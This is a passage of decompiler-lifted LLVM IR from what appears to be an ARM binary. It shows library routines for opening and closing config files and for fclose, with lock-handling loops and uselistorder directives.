  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 4, 3, 5, 0, 1, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg3, { 2, 3, 1, 5, 0, 4, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_142a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14288, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_14278, { 1, 0 }
  uselistorder label %dec_label_pc_14268, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1421c, { 1, 0 }
  uselistorder label %dec_label_pc_13fec.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1417c, { 1, 0 }
  uselistorder label %dec_label_pc_14154, { 1, 0 }
  uselistorder label %dec_label_pc_14148, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1410c, { 1, 0 }
  uselistorder label %dec_label_pc_14040, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_142b4 = icmp eq i32* %arg1, null
  br i1 %v2_142b4, label %dec_label_pc_142dc, label %dec_label_pc_142bc

dec_label_pc_142bc:                               ; preds = %entry
  %v2_142bc = load i32, i32* %arg1, align 4
  %v1_142c0 = inttoptr i32 %v2_142bc to i16*
  %v2_142c0 = call i32 @__GI_fclose(i16* %v1_142c0)
  %v0_142c4 = load i32, i32* @r4, align 4
  %v1_142c4 = add i32 %v0_142c4, 20
  %v2_142c4 = inttoptr i32 %v1_142c4 to i32*
  %v3_142c4 = load i32, i32* %v2_142c4, align 4
  %v2_142c8 = icmp eq i32 %v3_142c4, 0
  br i1 %v2_142c8, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_142bc
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_142bc, %bb
  store i32 82644, i32* @lr, align 4
  %v1_142d0 = xor i1 %v2_142c8, true
  call void @__pseudo_cond_branch(i1 %v1_142d0, i32 ptrtoint (i32* @global_var_11adc.29 to i32))
  %v0_142d4 = load i32, i32* @r4, align 4
  store i32 %v0_142d4, i32* @r0, align 4
  %v0_142d8 = call i32 @free()
  br label %dec_label_pc_142dc

dec_label_pc_142dc:                               ; preds = %entry, %bb6
  %v1_142e0 = phi i32 [ 0, %entry ], [ %v0_142d8, %bb6 ]
  ret i32 %v1_142e0

; uselistorder directives
  uselistorder label %dec_label_pc_142dc, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_142f0 = load i32, i32* @r4, align 4
  store i32 %v3_142f0, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -33996), i32* @r1, align 4
  %v0_142f8 = call i32 @__GI_fopen()
  store i32 %v0_142f8, i32* %r0.global-to-local, align 4
  store i32 %v0_142f8, i32* @r4, align 4
  %v2_142fc = icmp eq i32 %v0_142f8, 0
  br i1 %v2_142fc, label %bb, label %dec_label_pc_14308

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_14308:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_14310 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_14310, i32* %r0.global-to-local, align 4
  %v2_14314 = icmp eq i32 %v2_14310, 0
  br i1 %v2_14314, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_14308
  %v1_14318 = load i32, i32* @r4, align 4
  %v3_14318 = inttoptr i32 %v2_14310 to i32*
  store i32 %v1_14318, i32* %v3_14318, align 4
  %v1_14320.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_14308, %bb4
  %v1_14320 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_14308 ], [ %v1_14320.pre, %bb4 ]
  %v2_1431c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1431c, i32* @r4, align 4
  ret i32 %v1_14320

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 4, 3, 2, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 0, 7, 6, 5 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1432c = load i32, i32* @r4, align 4
  store i32 %v3_1432c, i32* %stack_var_-36, align 4
  %v6_1432c = load i32, i32* @r5, align 4
  %v9_1432c = load i32, i32* @r6, align 4
  %v12_1432c = load i32, i32* @r7, align 4
  %v2_14330 = add i32 %tmp, 52
  %v3_14330 = inttoptr i32 %v2_14330 to i32*
  %v4_14330 = load i32, i32* %v3_14330, align 4
  store i32 %v4_14330, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14338 = icmp eq i32 %v4_14330, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r8, align 4
  br i1 %v2_14338, label %dec_label_pc_1434c, label %dec_label_pc_143b0

dec_label_pc_1434c:                               ; preds = %entry
  %v0_1434c = call i32 @__aeabi_read_tp()
  store i32 %v0_1434c, i32* %r0.global-to-local, align 4
  %v0_14350 = load i32, i32* @r5, align 4
  %v1_14350 = add i32 %v0_14350, 64
  %v2_14350 = inttoptr i32 %v1_14350 to i32*
  %v3_14350 = load i32, i32* %v2_14350, align 4
  store i32 %v3_14350, i32* %r3.global-to-local, align 4
  %v1_14354 = add i32 %v0_1434c, -1168
  store i32 %v1_14354, i32* @r6, align 4
  %v3_14358 = icmp uge i32 %v3_14350, %v1_14354
  store i1 %v3_14358, i1* %cpsr_c.global-to-local, align 1
  %v9_14358 = icmp eq i32 %v3_14350, %v1_14354
  br i1 %v9_14358, label %dec_label_pc_143a4, label %dec_label_pc_14360

dec_label_pc_14360:                               ; preds = %dec_label_pc_1434c
  %v1_14360 = add i32 %v0_14350, 56
  store i32 %v1_14360, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_14360, i32* %r2.global-to-local, align 4
  %v0_1436c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1436c, i32* @r4, align 4
  %v1_14370115 = inttoptr i32 %v1_14360 to i32*
  %v2_14370116 = load i32, i32* %v1_14370115, align 4
  store i32 %v2_14370116, i32* %r3.global-to-local, align 4
  %v3_14374118 = icmp uge i32 %v2_14370116, %v0_1436c
  store i1 %v3_14374118, i1* %cpsr_c.global-to-local, align 1
  %v9_14374124 = icmp eq i32 %v2_14370116, %v0_1436c
  br i1 %v9_14374124, label %dec_label_pc_1437c, label %dec_label_pc_14394

dec_label_pc_1437c:                               ; preds = %dec_label_pc_14360, %dec_label_pc_1437c.dec_label_pc_14370_crit_edge
  %v0_1437c125 = phi i32 [ %v1_14374.pre, %dec_label_pc_1437c.dec_label_pc_14370_crit_edge ], [ %v0_1436c, %dec_label_pc_14360 ]
  store i32 %v0_1437c125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1438c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1438c, label %dec_label_pc_14390, label %dec_label_pc_1437c.dec_label_pc_14370_crit_edge

dec_label_pc_1437c.dec_label_pc_14370_crit_edge:  ; preds = %dec_label_pc_1437c
  %v0_14370.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14374.pre = load i32, i32* @r4, align 4
  %v1_14370 = inttoptr i32 %v0_14370.pre to i32*
  %v2_14370 = load i32, i32* %v1_14370, align 4
  store i32 %v2_14370, i32* %r3.global-to-local, align 4
  %v3_14374 = icmp uge i32 %v2_14370, %v1_14374.pre
  store i1 %v3_14374, i1* %cpsr_c.global-to-local, align 1
  %v9_14374 = icmp eq i32 %v2_14370, %v1_14374.pre
  br i1 %v9_14374, label %dec_label_pc_1437c, label %dec_label_pc_14394

dec_label_pc_14390:                               ; preds = %dec_label_pc_1437c
  %v0_14390 = load i32, i32* @r4, align 4
  store i32 %v0_14390, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14394

dec_label_pc_14394:                               ; preds = %dec_label_pc_14360, %dec_label_pc_1437c.dec_label_pc_14370_crit_edge, %dec_label_pc_14390
  %v0_14394 = phi i32 [ %v0_14390, %dec_label_pc_14390 ], [ %v2_14370116, %dec_label_pc_14360 ], [ %v2_14370, %dec_label_pc_1437c.dec_label_pc_14370_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14394 = icmp eq i32 %v0_14394, 0
  br i1 %v2_14394, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_14394
  %v1_14398 = load i32, i32* @r7, align 4
  store i32 %v1_14398, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_14394, %bb
  %v1_1439c = xor i1 %v2_14394, true
  call void @__pseudo_cond_branch(i1 %v1_1439c, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_143a0 = load i32, i32* @r6, align 4
  %v1_143a0 = load i32, i32* @r5, align 4
  %v2_143a0 = add i32 %v1_143a0, 64
  %v3_143a0 = inttoptr i32 %v2_143a0 to i32*
  store i32 %v0_143a0, i32* %v3_143a0, align 4
  %v0_143a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_143a4

dec_label_pc_143a4:                               ; preds = %dec_label_pc_1434c, %bb41
  %v0_143a4 = phi i32 [ %v0_14350, %dec_label_pc_1434c ], [ %v0_143a4.pre, %bb41 ]
  %v1_143a4 = add i32 %v0_143a4, 60
  %v2_143a4 = inttoptr i32 %v1_143a4 to i32*
  %v3_143a4 = load i32, i32* %v2_143a4, align 4
  %v1_143a8 = add i32 %v3_143a4, 1
  store i32 %v1_143a8, i32* %r3.global-to-local, align 4
  store i32 %v1_143a8, i32* %v2_143a4, align 4
  %v0_143b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_143b0

dec_label_pc_143b0:                               ; preds = %entry, %dec_label_pc_143a4
  %v1_143b8 = phi i32 [ %tmp, %entry ], [ %v0_143b0.pre, %dec_label_pc_143a4 ]
  %v1_143b0 = inttoptr i32 %v1_143b8 to i16*
  %v2_143b0 = load i16, i16* %v1_143b0, align 2
  %v3_143b0 = zext i16 %v2_143b0 to i32
  store i32 %v3_143b0, i32* %r3.global-to-local, align 4
  %v1_143b4 = and i32 %v3_143b0, 64
  %v2_143b4 = icmp eq i32 %v1_143b4, 0
  br i1 %v2_143b4, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_143b0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_143b0, %bb42
  %storemerge = phi i32 [ %v1_143b8, %bb42 ], [ %v1_143b4, %dec_label_pc_143b0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 82880, i32* @lr, align 4
  %v1_143bc = xor i1 %v2_143b4, true
  call void @__pseudo_cond_branch(i1 %v1_143bc, i32 ptrtoint (i32* @global_var_15200.827 to i32))
  %v0_143c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_143c0, i32* %fp.global-to-local, align 4
  %v0_143c4 = load i32, i32* @r5, align 4
  %v1_143c4 = add i32 %v0_143c4, 4
  %v2_143c4 = inttoptr i32 %v1_143c4 to i32*
  %v3_143c4 = load i32, i32* %v2_143c4, align 4
  store i32 %v3_143c4, i32* %r0.global-to-local, align 4
  %v1_143c8 = call i32 @__GI___libc_close(i32 %v3_143c4)
  store i32 %v1_143c8, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_143d0 = load i32, i32* @r8, align 4
  %v2_143d0 = add i32 %v0_143d0, 160
  %v3_143d0 = inttoptr i32 %v2_143d0 to i32*
  %v4_143d0 = load i32, i32* %v3_143d0, align 4
  store i32 %v4_143d0, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_143d4 = icmp slt i32 %v1_143c8, 0
  br i1 %v1_143d4, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_143dc = add i32 %v4_143d0, 8
  %v2_143dc = inttoptr i32 %v1_143dc to i32*
  %v3_143dc = load i32, i32* %v2_143dc, align 4
  store i32 %v3_143dc, i32* %r3.global-to-local, align 4
  %v0_143e0 = call i32 @__aeabi_read_tp()
  store i32 %v0_143e0, i32* %r0.global-to-local, align 4
  %v1_143e4 = add i32 %v0_143e0, -1168
  store i32 %v1_143e4, i32* %sl.global-to-local, align 4
  %v0_143e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_143e8 = icmp uge i32 %v0_143e8, %v1_143e4
  store i1 %v3_143e8, i1* %cpsr_c.global-to-local, align 1
  %v9_143e8 = icmp eq i32 %v0_143e8, %v1_143e4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_143f0 = load i32, i32* @r5, align 4
  %v2_143f0 = add i32 %v1_143f0, 4
  %v3_143f0 = inttoptr i32 %v2_143f0 to i32*
  store i32 -1, i32* %v3_143f0, align 4
  br i1 %v9_143e8, label %dec_label_pc_14438, label %dec_label_pc_143f8

dec_label_pc_143f8:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_143fc = load i32, i32* @r7, align 4
  store i32 %v0_143fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_14404108 = inttoptr i32 %v0_143fc to i32*
  %v2_14404109 = load i32, i32* %v1_14404108, align 4
  store i32 %v2_14404109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14408111 = icmp eq i32 %v2_14404109, 0
  br i1 %v9_14408111, label %dec_label_pc_14410, label %dec_label_pc_14428

dec_label_pc_14410:                               ; preds = %dec_label_pc_143f8, %dec_label_pc_14410.dec_label_pc_14404_crit_edge
  %v0_14410112 = phi i32 [ %v1_14408.pre, %dec_label_pc_14410.dec_label_pc_14404_crit_edge ], [ 0, %dec_label_pc_143f8 ]
  store i32 %v0_14410112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14420 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14420, label %dec_label_pc_14424, label %dec_label_pc_14410.dec_label_pc_14404_crit_edge

dec_label_pc_14410.dec_label_pc_14404_crit_edge:  ; preds = %dec_label_pc_14410
  %v0_14404.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14408.pre = load i32, i32* @r4, align 4
  %v1_14404 = inttoptr i32 %v0_14404.pre to i32*
  %v2_14404 = load i32, i32* %v1_14404, align 4
  store i32 %v2_14404, i32* %r3.global-to-local, align 4
  %v3_14408 = icmp uge i32 %v2_14404, %v1_14408.pre
  store i1 %v3_14408, i1* %cpsr_c.global-to-local, align 1
  %v9_14408 = icmp eq i32 %v2_14404, %v1_14408.pre
  br i1 %v9_14408, label %dec_label_pc_14410, label %dec_label_pc_14428

dec_label_pc_14424:                               ; preds = %dec_label_pc_14410
  %v0_14424 = load i32, i32* @r4, align 4
  store i32 %v0_14424, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14428

dec_label_pc_14428:                               ; preds = %dec_label_pc_143f8, %dec_label_pc_14410.dec_label_pc_14404_crit_edge, %dec_label_pc_14424
  %v0_14428 = phi i32 [ %v0_14424, %dec_label_pc_14424 ], [ %v2_14404109, %dec_label_pc_143f8 ], [ %v2_14404, %dec_label_pc_14410.dec_label_pc_14404_crit_edge ]
  %v1_14428 = phi i32 [ %v0_14424, %dec_label_pc_14424 ], [ 0, %dec_label_pc_143f8 ], [ %v1_14408.pre, %dec_label_pc_14410.dec_label_pc_14404_crit_edge ]
  %v3_14428 = icmp uge i32 %v0_14428, %v1_14428
  store i1 %v3_14428, i1* %cpsr_c.global-to-local, align 1
  %v9_14428 = icmp eq i32 %v0_14428, %v1_14428
  br i1 %v9_14428, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_14428
  %v1_1442c = load i32, i32* @r7, align 4
  store i32 %v1_1442c, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_14428, %bb46
  %v1_14430 = xor i1 %v9_14428, true
  call void @__pseudo_cond_branch(i1 %v1_14430, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_14434 = load i32, i32* %sl.global-to-local, align 4
  %v1_14434 = load i32, i32* @r7, align 4
  %v2_14434 = add i32 %v1_14434, 8
  %v3_14434 = inttoptr i32 %v2_14434 to i32*
  store i32 %v0_14434, i32* %v3_14434, align 4
  br label %dec_label_pc_14438

dec_label_pc_14438:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1443c = load i32, i32* @r8, align 4
  %v2_1443c = add i32 %v0_1443c, 160
  %v3_1443c = inttoptr i32 %v2_1443c to i32*
  %v4_1443c = load i32, i32* %v3_1443c, align 4
  store i32 %v4_1443c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14444 = add i32 %v0_1443c, 12
  %v3_14444 = inttoptr i32 %v2_14444 to i32*
  %v4_14444 = load i32, i32* %v3_14444, align 4
  store i32 %v4_14444, i32* %r2.global-to-local, align 4
  %v1_14448 = add i32 %v4_1443c, 4
  %v2_14448 = inttoptr i32 %v1_14448 to i32*
  %v3_14448 = load i32, i32* %v2_14448, align 4
  store i32 %v3_14448, i32* %r1.global-to-local, align 4
  %v1_1444c = inttoptr i32 %v4_14444 to i32*
  %v2_1444c = load i32, i32* %v1_1444c, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14450 = icmp eq i32 %v3_14448, 0
  %v1_14454 = add i32 %v2_1444c, 1
  store i32 %v1_14454, i32* %r3.global-to-local, align 4
  store i32 %v1_14454, i32* %v1_1444c, align 4
  br i1 %v2_14450, label %dec_label_pc_14460, label %dec_label_pc_144c0

dec_label_pc_14460:                               ; preds = %dec_label_pc_14438
  %v0_14460 = load i32, i32* %r1.global-to-local, align 4
  %v1_14460 = load i32, i32* %r0.global-to-local, align 4
  %v2_14460 = add i32 %v1_14460, 8
  %v3_14460 = inttoptr i32 %v2_14460 to i32*
  store i32 %v0_14460, i32* %v3_14460, align 4
  %v0_14464 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14464, i32* @r7, align 4
  br label %dec_label_pc_14468

dec_label_pc_14468:                               ; preds = %dec_label_pc_14498.dec_label_pc_14468_crit_edge, %dec_label_pc_14460
  %v0_14468 = phi i32 [ %v0_14468.pre, %dec_label_pc_14498.dec_label_pc_14468_crit_edge ], [ %v0_14464, %dec_label_pc_14460 ]
  %v1_14468 = inttoptr i32 %v0_14468 to i32*
  %v2_14468 = load i32, i32* %v1_14468, align 4
  store i32 %v2_14468, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_14468, i32* %r2.global-to-local, align 4
  %v2_1447496 = load i32, i32* %v1_14468, align 4
  store i32 %v2_1447496, i32* %r3.global-to-local, align 4
  %v3_1447898 = icmp uge i32 %v2_1447496, %v2_14468
  store i1 %v3_1447898, i1* %cpsr_c.global-to-local, align 1
  %v9_14478104 = icmp eq i32 %v2_1447496, %v2_14468
  br i1 %v9_14478104, label %dec_label_pc_14480, label %dec_label_pc_14498

dec_label_pc_14480:                               ; preds = %dec_label_pc_14468, %dec_label_pc_14480.dec_label_pc_14474_crit_edge
  %v0_14480105 = phi i32 [ %v1_14478.pre, %dec_label_pc_14480.dec_label_pc_14474_crit_edge ], [ %v2_14468, %dec_label_pc_14468 ]
  store i32 %v0_14480105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14490 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14490, label %dec_label_pc_14494, label %dec_label_pc_14480.dec_label_pc_14474_crit_edge

dec_label_pc_14480.dec_label_pc_14474_crit_edge:  ; preds = %dec_label_pc_14480
  %v0_14474.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14478.pre = load i32, i32* @r4, align 4
  %v1_14474 = inttoptr i32 %v0_14474.pre to i32*
  %v2_14474 = load i32, i32* %v1_14474, align 4
  store i32 %v2_14474, i32* %r3.global-to-local, align 4
  %v3_14478 = icmp uge i32 %v2_14474, %v1_14478.pre
  store i1 %v3_14478, i1* %cpsr_c.global-to-local, align 1
  %v9_14478 = icmp eq i32 %v2_14474, %v1_14478.pre
  br i1 %v9_14478, label %dec_label_pc_14480, label %dec_label_pc_14498

dec_label_pc_14494:                               ; preds = %dec_label_pc_14480
  %v0_14494 = load i32, i32* @r4, align 4
  store i32 %v0_14494, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14498

dec_label_pc_14498:                               ; preds = %dec_label_pc_14468, %dec_label_pc_14480.dec_label_pc_14474_crit_edge, %dec_label_pc_14494
  %v0_144a0 = phi i32 [ %v0_14494, %dec_label_pc_14494 ], [ %v2_1447496, %dec_label_pc_14468 ], [ %v2_14474, %dec_label_pc_14480.dec_label_pc_14474_crit_edge ]
  %v1_14498 = phi i32 [ %v0_14494, %dec_label_pc_14494 ], [ %v2_14468, %dec_label_pc_14468 ], [ %v1_14478.pre, %dec_label_pc_14480.dec_label_pc_14474_crit_edge ]
  %v3_14498 = icmp uge i32 %v0_144a0, %v1_14498
  store i1 %v3_14498, i1* %cpsr_c.global-to-local, align 1
  %v9_14498 = icmp eq i32 %v0_144a0, %v1_14498
  br i1 %v9_14498, label %dec_label_pc_144a0, label %dec_label_pc_14498.dec_label_pc_14468_crit_edge

dec_label_pc_14498.dec_label_pc_14468_crit_edge:  ; preds = %dec_label_pc_14498
  %v0_14468.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14468

dec_label_pc_144a0:                               ; preds = %dec_label_pc_14498
  %v2_144a0 = icmp ne i32 %v1_14498, 0
  store i1 %v2_144a0, i1* %cpsr_c.global-to-local, align 1
  %v7_144a4 = icmp slt i32 %v1_14498, 2
  br i1 %v7_144a4, label %dec_label_pc_144c0, label %dec_label_pc_144a8

dec_label_pc_144a8:                               ; preds = %dec_label_pc_144a0
  %v0_144a8 = load i32, i32* @r7, align 4
  store i32 %v0_144a8, i32* %r0.global-to-local, align 4
  %v0_144ac = load i32, i32* %r1.global-to-local, align 4
  %v1_144ac = add i32 %v0_144ac, 129
  store i32 %v1_144ac, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_144c0

dec_label_pc_144c0:                               ; preds = %dec_label_pc_14438, %dec_label_pc_144a8, %dec_label_pc_144a0
  %v0_144c0 = load i32, i32* @r5, align 4
  %v1_144c0 = inttoptr i32 %v0_144c0 to i16*
  %v2_144c0 = load i16, i16* %v1_144c0, align 2
  %v3_144c0 = zext i16 %v2_144c0 to i32
  %v1_144c4 = and i32 %v3_144c0, 24576
  %v1_144c8 = or i32 %v1_144c4, 48
  store i32 %v1_144c8, i32* %r3.global-to-local, align 4
  %v0_144cc = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144cc = icmp eq i32 %v0_144cc, 0
  %v1_144d0 = trunc i32 %v1_144c8 to i16
  store i16 %v1_144d0, i16* %v1_144c0, align 2
  br i1 %v2_144cc, label %dec_label_pc_144d8, label %dec_label_pc_1454c

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144c0
  %v0_144d8 = load i32, i32* @r5, align 4
  %v1_144d8 = add i32 %v0_144d8, 60
  %v2_144d8 = inttoptr i32 %v1_144d8 to i32*
  %v3_144d8 = load i32, i32* %v2_144d8, align 4
  %v1_144dc = add i32 %v3_144d8, -1
  store i32 %v1_144dc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144e0 = icmp eq i32 %v1_144dc, 0
  store i32 %v1_144dc, i32* %v2_144d8, align 4
  br i1 %v2_144e0, label %dec_label_pc_144ec, label %dec_label_pc_1454c

dec_label_pc_144ec:                               ; preds = %dec_label_pc_144d8
  %v0_144ec = load i32, i32* %r3.global-to-local, align 4
  %v1_144ec = load i32, i32* @r5, align 4
  %v2_144ec = add i32 %v1_144ec, 64
  %v3_144ec = inttoptr i32 %v2_144ec to i32*
  store i32 %v0_144ec, i32* %v3_144ec, align 4
  %v0_144f0 = load i32, i32* @r5, align 4
  %v1_144f0 = add i32 %v0_144f0, 56
  store i32 %v1_144f0, i32* @r6, align 4
  br label %dec_label_pc_144f4

dec_label_pc_144f4:                               ; preds = %dec_label_pc_14524.dec_label_pc_144f4_crit_edge, %dec_label_pc_144ec
  %v0_144fc = phi i32 [ %v0_144fc.pre, %dec_label_pc_14524.dec_label_pc_144f4_crit_edge ], [ %v1_144f0, %dec_label_pc_144ec ]
  %v0_144f4 = phi i32 [ %v0_144f4.pre, %dec_label_pc_14524.dec_label_pc_144f4_crit_edge ], [ %v0_144f0, %dec_label_pc_144ec ]
  %v1_144f4 = add i32 %v0_144f4, 56
  %v2_144f4 = inttoptr i32 %v1_144f4 to i32*
  %v3_144f4 = load i32, i32* %v2_144f4, align 4
  store i32 %v3_144f4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_144fc, i32* %r2.global-to-local, align 4
  %v1_1450082 = inttoptr i32 %v0_144fc to i32*
  %v2_1450083 = load i32, i32* %v1_1450082, align 4
  store i32 %v2_1450083, i32* %r3.global-to-local, align 4
  %v3_1450485 = icmp uge i32 %v2_1450083, %v3_144f4
  store i1 %v3_1450485, i1* %cpsr_c.global-to-local, align 1
  %v9_1450491 = icmp eq i32 %v2_1450083, %v3_144f4
  br i1 %v9_1450491, label %dec_label_pc_1450c, label %dec_label_pc_14524

dec_label_pc_1450c:                               ; preds = %dec_label_pc_144f4, %dec_label_pc_1450c.dec_label_pc_14500_crit_edge
  %v0_1450c92 = phi i32 [ %v1_14504.pre, %dec_label_pc_1450c.dec_label_pc_14500_crit_edge ], [ %v3_144f4, %dec_label_pc_144f4 ]
  store i32 %v0_1450c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1451c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1451c, label %dec_label_pc_14520, label %dec_label_pc_1450c.dec_label_pc_14500_crit_edge

dec_label_pc_1450c.dec_label_pc_14500_crit_edge:  ; preds = %dec_label_pc_1450c
  %v0_14500.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14504.pre = load i32, i32* @r4, align 4
  %v1_14500 = inttoptr i32 %v0_14500.pre to i32*
  %v2_14500 = load i32, i32* %v1_14500, align 4
  store i32 %v2_14500, i32* %r3.global-to-local, align 4
  %v3_14504 = icmp uge i32 %v2_14500, %v1_14504.pre
  store i1 %v3_14504, i1* %cpsr_c.global-to-local, align 1
  %v9_14504 = icmp eq i32 %v2_14500, %v1_14504.pre
  br i1 %v9_14504, label %dec_label_pc_1450c, label %dec_label_pc_14524

dec_label_pc_14520:                               ; preds = %dec_label_pc_1450c
  %v0_14520 = load i32, i32* @r4, align 4
  store i32 %v0_14520, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14524

dec_label_pc_14524:                               ; preds = %dec_label_pc_144f4, %dec_label_pc_1450c.dec_label_pc_14500_crit_edge, %dec_label_pc_14520
  %v0_1452c = phi i32 [ %v0_14520, %dec_label_pc_14520 ], [ %v2_1450083, %dec_label_pc_144f4 ], [ %v2_14500, %dec_label_pc_1450c.dec_label_pc_14500_crit_edge ]
